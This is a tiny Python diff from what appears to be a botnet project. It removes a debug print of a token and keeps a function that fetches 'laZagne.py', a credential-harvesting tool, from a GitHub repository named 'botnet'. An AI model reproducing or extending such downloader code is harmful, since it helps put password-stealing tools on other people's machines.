@@ -21,7 +21,6 @@ def downloadFile(urlb, token):
     return sha, content
 
 def run(token):
-    print(token)
     urlb = "https://api.github.com/repos/Pol-Ruiz/botnet/contents/laZagne.py"
     # Descargar el archivo
     downloadFile(urlb, token)
